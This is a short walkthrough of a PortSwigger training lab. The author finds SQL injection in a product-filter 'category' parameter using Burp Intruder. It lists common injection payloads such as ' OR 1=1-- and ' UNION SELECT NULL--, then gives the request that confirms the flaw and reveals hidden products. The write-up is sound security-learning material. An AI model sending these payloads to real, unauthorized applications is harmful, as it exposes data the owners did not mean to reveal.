🧪 PortSwigger Lab — SQL Injection Using Burp Intruder (Payload File Method)
📌 Lab Objective

Exploit a SQL injection vulnerability in the category parameter to retrieve hidden products.

Instead of testing manually, I used Burp Intruder with a custom SQL payload file to automate detection.

🔎 Step 1 — Identify Injection Point

While browsing product categories, the application generated:

GET /filter?category=Accessories

The category parameter is user-controlled and reflected in backend SQL queries.

This makes it a strong injection candidate.

🚀 Step 2 — Send Request to Intruder

In Burp:

Proxy → HTTP History

Right-click request

Send to Intruder

Positions Configuration

Cleared all auto-selected markers

Highlighted only:

Accessories

Burp formatted it as:

GET /filter?category=§Accessories§

Attack type: Sniper

📂 Step 3 — Load SQL Payload File

Go to this link to download fuzzing file

In the Payloads tab:

Payload type: Simple List

Loaded external SQL injection payload file containing common boolean-based tests:

Examples from file:

'
''
'--
' OR 1=1--
' OR 1=1#
' OR '1'='1
' AND 1=2--
' ORDER BY 1--
' UNION SELECT NULL--

This allows automated testing without manual repetition.

📊 Step 4 — Analyze Results

After launching the attack, I sorted results by:

Response Length

Status Code

Baseline response length:

~4978 bytes

Payload:

' OR 1=1--

Response length:

~14000+ bytes

Significant increase in page size indicates:

Query condition evaluated TRUE

Hidden products returned

SQL injection confirmed

🎯 Step 5 — Confirm in Repeater

After identifying the working payload, I sent it to Repeater for validation:

GET /filter?category=' OR 1=1--

The page displayed all products, including unreleased items.

Lab solved.
